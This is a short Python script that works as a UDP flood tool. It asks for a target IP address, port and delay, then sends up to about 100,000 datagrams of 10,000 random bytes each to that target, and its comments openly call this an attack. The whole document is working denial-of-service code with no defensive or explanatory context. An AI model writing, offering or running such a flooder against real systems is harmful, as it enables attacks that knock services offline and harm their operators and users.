import socket
import random
import time

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Enter website IP address
ip = input("Target IP Adress: ")

# Enter port
port = int(input("Target port: "))

# Time to stop the attack (In secs)
stop_ATK = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100*1000):
    s.send(random._urandom(10)*1000)
    print(f"Send: {i}", end="\r")
    time.sleep(stop_ATK)